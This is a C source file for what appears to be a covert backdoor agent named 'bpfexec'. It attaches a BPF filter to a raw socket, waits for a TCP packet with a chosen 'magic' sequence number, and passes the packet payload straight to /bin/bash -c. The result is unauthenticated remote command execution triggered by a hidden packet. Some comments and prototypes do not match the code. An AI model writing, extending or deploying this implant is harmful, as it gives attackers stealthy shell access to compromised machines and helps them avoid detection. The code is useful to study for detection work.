#include <arpa/inet.h>
#include <linux/filter.h>
#include <linux/if_ether.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>

#include "common.h"
#include "config.h"
#include "networking.h"

static int CreateTCPFilterSocket();
static int RunCommand(char* cmd);

int StartAgent()
{
    int sock = -1;
    int exit_code = EXIT_FAILURE;
    int ret = EXIT_FAILURE;
    unsigned char* packet_data = NULL;

    bpfexec_config_t* config = NULL;

    config = GetBPFExecConfig();
    sock = CreateTCPFilterSocket(config->sequence_number);
    if (-1 == sock)
    {
        (void)fprintf(stderr, "Failed to create TCP filter socket\n");
        goto end;
    }
    printf("Filtering packets for sequence number: %u\n", config->sequence_number);

    if (AcceptPacket(sock, &packet_data))
    {
        (void)fprintf(stderr, "Failed to accept packet\n");
        goto end;
    }

    ret = RunCommand((char*)packet_data);
    if (EXIT_SUCCESS != ret)
    {
        (void)fprintf(stderr, "Command execution failed\n");
    }

end:
    NFREE(packet_data);
    if (-1 != sock)
    {
        close(sock);
    }
    return exit_code;
}

/**
 * @brief Runs a command with bash
 * 
 * @param cmd command to run
 * @return int EXIT_SUCCESS on success, EXIT_FAILURE on failure.
 */
static int RunCommand(char* cmd)
{
    int exit_code = EXIT_FAILURE;
    pid_t pid = fork();

    if (NULL == cmd)
    {
        (void)fprintf(stderr, "Command cannot be NULL\n");
        goto end;
    }

    if (-1 == pid)
    {
        perror("fork failed");
        goto end;
    }

    if (0 == pid)
    {
        execl("/bin/bash", "bash", "-c", cmd, (char*)NULL);
        perror("execlp failed");
        exit(EXIT_FAILURE);
    }

    exit_code = EXIT_SUCCESS;

end:
    return exit_code;
}

static int CreateUDPFilterSocket(uint16_t port)
{
    int sock = -1;
    const int code_size = 16;
    const int port_idx_1 = 5;
    const int port_idx_2 = 13;

    // udp and src port = port
    struct sock_filter code[] = {

        {0x28, 0, 0, 0x0000000c},  {0x15, 0, 4, 0x000086dd}, {0x30, 0, 0, 0x00000014},
        {0x15, 0, 11, 0x00000011}, {0x28, 0, 0, 0x00000036}, {0x15, 8, 9, 0xffffffff},
        {0x15, 0, 8, 0x00000800},  {0x30, 0, 0, 0x00000017}, {0x15, 0, 6, 0x00000011},
        {0x28, 0, 0, 0x00000014},  {0x45, 4, 0, 0x00001fff}, {0xb1, 0, 0, 0x0000000e},
        {0x48, 0, 0, 0x0000000e},  {0x15, 0, 1, 0xffffffff}, {0x6, 0, 0, 0x00040000},
        {0x6, 0, 0, 0x00000000},

    };

    code[port_idx_1].k = port;
    code[port_idx_2].k = port;

    struct sock_fprog bpf = {
        .len = code_size,
        .filter = code,
    };

    sock = CreateRawFilterSocket(&bpf);
    if (-1 == sock)
    {
        (void)fprintf(stderr, "Could not create raw udp filter socket");
    }

    return sock;
}

/**
 * @brief Create a TCP filter socket for port 4578.
 * 
 * @return int the file descriptor of the created socket, or -1 on failure.
 */
static int CreateTCPFilterSocket(uint32_t sequence_number)
{
    int sock = -1;
    const int code_size = 11;
    const int sequence_idx = 8;

    // tcp[4:4] = sequence_number
    struct sock_filter code[] = {
        {0x28, 0, 0, 0x0000000c}, {0x15, 0, 8, 0x00000800}, {0x30, 0, 0, 0x00000017},
        {0x15, 0, 6, 0x00000006}, {0x28, 0, 0, 0x00000014}, {0x45, 4, 0, 0x00001fff},
        {0xb1, 0, 0, 0x0000000e}, {0x40, 0, 0, 0x00000012}, {0x15, 0, 1, 0xffffffff},
        {0x6, 0, 0, 0x00040000},  {0x6, 0, 0, 0x00000000},

    };

    code[sequence_idx].k = sequence_number;

    struct sock_fprog bpf = {
        .len = code_size,
        .filter = code,
    };

    sock = CreateRawFilterSocket(&bpf);
    if (-1 == sock)
    {
        (void)fprintf(stderr, "Could not create raw tcp filter socket\n");
    }

    return sock;
}
